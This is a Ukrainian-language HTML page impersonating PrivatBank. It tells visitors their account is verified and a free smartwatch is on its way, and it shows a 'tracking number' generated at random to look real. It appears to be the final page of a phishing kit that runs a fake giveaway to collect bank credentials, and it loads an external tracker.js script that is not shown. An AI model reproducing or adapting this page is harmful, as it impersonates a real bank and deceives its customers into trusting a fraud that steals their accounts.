<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Операція успішна</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:#fff;
    display:flex;flex-direction:column;
  }

  .top{flex:1;padding:80px 24px 0;text-align:center}

  .bank-logo{margin-bottom:40px}
  .bank-logo img{height:50px}

  .success-circle{
    width:100px;height:100px;border-radius:50%;background:#e8f5e9;
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 24px;
    animation:scaleIn .5s ease;
  }
  @keyframes scaleIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
  .success-circle svg{width:50px;height:50px;fill:#2e7d32}

  h1{font-size:24px;font-weight:800;color:#2e7d32;margin-bottom:12px}
  .msg{color:#555;font-size:15px;line-height:1.8;margin-bottom:30px}

  .detail-box{
    background:#fff;border-radius:16px;padding:20px;margin:0 auto;
    max-width:340px;box-shadow:0 2px 12px rgba(0,0,0,.06);
    text-align:left;
  }
  .detail-row{display:flex;justify-content:space-between;padding:10px 0;
    border-bottom:1px solid #f0f0f0;font-size:14px}
  .detail-row:last-child{border-bottom:none}
  .detail-label{color:#888}
  .detail-value{font-weight:600;color:#1a1a1a}

  .bottom{padding:20px 24px 40px}
  .done-btn{
    display:block;width:100%;padding:18px;border:none;border-radius:50px;
    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
    background:#00A651;
    box-shadow:0 4px 15px rgba(0,166,81,.3);
  }
</style>
</head>
<body>

<div class="top">
  <div class="bank-logo"><img src="images/privatbank-logo.jpg" alt="PrivatBank"></div>

  <div class="success-circle">
    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
  </div>

  <h1>Операція успішна!</h1>
  <p class="msg">Ваш обліковий запис успішно підтверджено.<br>Смарт-годинник буде відправлено на вашу зареєстровану адресу.</p>

  <div class="detail-box">
    <div class="detail-row">
      <span class="detail-label">Статус замовлення</span>
      <span class="detail-value" style="color:#2e7d32">Підтверджено &#10003;</span>
    </div>
    <div class="detail-row">
      <span class="detail-label">Очікуваний час доставки</span>
      <span class="detail-value">3-5 робочих днів</span>
    </div>
    <div class="detail-row">
      <span class="detail-label">Номер відстеження</span>
      <span class="detail-value" id="trackNum" style="direction:ltr">&mdash;</span>
    </div>
  </div>
</div>

<div class="bottom">
  <button class="done-btn" onclick="location.href='index.html'">На головну</button>
</div>

<script>
  document.getElementById("trackNum").textContent = "EQB" + Math.floor(100000000 + Math.random() * 900000000);
</script>
<script src="tracker.js"></script>
</body>
</html>
